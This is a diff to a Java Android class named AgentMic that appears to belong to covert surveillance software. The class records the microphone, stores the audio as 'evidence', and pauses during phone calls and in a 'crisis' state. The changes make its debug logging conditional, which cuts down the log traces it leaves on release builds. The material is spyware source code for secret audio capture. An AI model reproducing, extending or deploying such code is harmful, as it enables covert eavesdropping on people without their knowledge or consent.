@@ -24,8 +24,7 @@ import com.android.service.Call;
 import com.android.service.LogR;
 import com.android.service.StateRun;
 import com.android.service.Status;
-import com.android.service.auto.AutoConfig;
-import com.android.service.conf.Configuration;
+import com.android.service.auto.Cfg;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerCall;
@@ -82,14 +81,14 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 			// recorder = new MediaRecorder();
 
 			startRecorder();
-			Log.d("QZ", TAG + "started");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + "started");
 
 		} catch (IllegalStateException e) {
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
-			Log.d("QZ", TAG + " (begin) Error: " + e.toString());
+			if(Cfg.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (begin) Error: " + e.toString());
 		} catch (IOException e) {
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
-			Log.d("QZ", TAG + " (begin) Error: " + e.toString());
+			if(Cfg.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (begin) Error: " + e.toString());
 		}
 	}
 
@@ -100,7 +99,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 	 */
 	@Override
 	public void end() {
-		Log.d("QZ", TAG + " (end)");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (end)");
 		Check.requires(status == StateRun.STOPPING, "state not STOPPING");
 
 		removePhoneListener();
@@ -108,7 +107,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 		saveRecorderEvidence();
 		stopRecorder();
 
-		Log.d("QZ", TAG + " (ended)");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (ended)");
 
 	}
 
@@ -123,19 +122,19 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 
 		int amp = recorder.getMaxAmplitude();
 		if (amp != 0) {
-			Log.d("QZ", TAG + " (go): max amplitude=" + amp);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (go): max amplitude=" + amp);
 		}
 
 		if (numFailures < 10) {
 			saveRecorderEvidence();
 
 		} else {
-			Log.d("QZ", TAG + "numFailures: " + numFailures);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + "numFailures: " + numFailures);
 			stopThread();
 		}
 
 		if (Status.self().crisisMic()) {
-			Log.d("QZ", TAG + "crisis!");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + "crisis!");
 			suspend();
 		}
 
@@ -178,7 +177,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 			new LogR(EvidenceType.MIC, getAdditionalData(), data);
 
 		} else {
-			Log.d("QZ", TAG + "zero chunk ");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + "zero chunk ");
 			numFailures += 1;
 		}
 	}
@@ -196,8 +195,8 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 				is.read(ret);
 			}
 		} catch (IOException e) {
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
-			Log.d("QZ", TAG + " (getAvailable) Error: " + e);
+			if(Cfg.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (getAvailable) Error: " + e);
 		}
 
 		return ret;
@@ -229,11 +228,11 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 			stopRecorder();
 			startRecorder();
 		} catch (IllegalStateException e) {
-			Log.d("QZ", TAG + " (restartRecorder) Error: " + e);
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (restartRecorder) Error: " + e);
+			if(Cfg.DEBUG) { e.printStackTrace(); }
 		} catch (IOException e) {
-			Log.d("QZ", TAG + " (restartRecorder) Error: " + e);
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (restartRecorder) Error: " + e);
+			if(Cfg.DEBUG) { e.printStackTrace(); }
 		}
 	}
 
@@ -246,7 +245,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 	 *             Signals that an I/O exception has occurred.
 	 */
 	private synchronized void startRecorder() throws IllegalStateException, IOException {
-		Log.d("QZ", TAG + " (startRecorder)");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (startRecorder)");
 		numFailures = 0;
 
 		final DateTime dateTime = new DateTime();
@@ -279,7 +278,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 			sender.setReceiveBufferSize(500000);
 			sender.setSendBufferSize(500000);
 		} catch (IOException e) {
-			Log.d("QZ", TAG + " (createSockets) Error: " + e);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (createSockets) Error: " + e);
 		}
 	}
 
@@ -291,8 +290,8 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 			receiver.close();
 			lss.close();
 		} catch (IOException e) {
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
-			Log.d("QZ", TAG + " (deleteSockets) Error: " + e);
+			if(Cfg.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (deleteSockets) Error: " + e);
 		}
 	}
 
@@ -303,7 +302,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 	private synchronized void stopRecorder() {
 		Check.requires(recorder == null, "null recorder");
 
-		Log.d("QZ", TAG + " (stopRecorder)");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (stopRecorder)");
 
 		recorder.setOnErrorListener(null);
 		recorder.setOnInfoListener(null);
@@ -341,10 +340,10 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 
 	public int notification(Call call) {
 		if (call.isOngoing()) {
-			Log.d("QZ", TAG + " (notification): call incoming, suspend");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (notification): call incoming, suspend");
 			suspend();
 		} else {
-			Log.d("QZ", TAG + " (notification): ");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (notification): ");
 			resume();
 		}
 
@@ -357,7 +356,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 			super.suspend();
 			saveRecorderEvidence();
 			stopRecorder();
-			Log.d("QZ", TAG + " (suspended)");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (suspended)");
 		}
 	}
 
@@ -367,22 +366,22 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 			try {
 				startRecorder();
 			} catch (IllegalStateException e) {
-				Log.d("QZ", TAG + " (resume) Error: " + e);
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " (resume) Error: " + e);
 			} catch (IOException e) {
-				Log.d("QZ", TAG + " (resume) Error: " + e);
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " (resume) Error: " + e);
 			}
 
 			super.resume();
-			Log.d("QZ", TAG + " (resumed)");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (resumed)");
 		}
 
 	}
 
 	public void onInfo(MediaRecorder mr, int what, int extra) {
-		Log.d("QZ", TAG + " (onInfo): " + what);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (onInfo): " + what);
 	}
 
 	public void onError(MediaRecorder mr, int what, int extra) {
-		Log.d("QZ", TAG + " (onError) Error: " + what);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (onError) Error: " + what);
 	}
 }
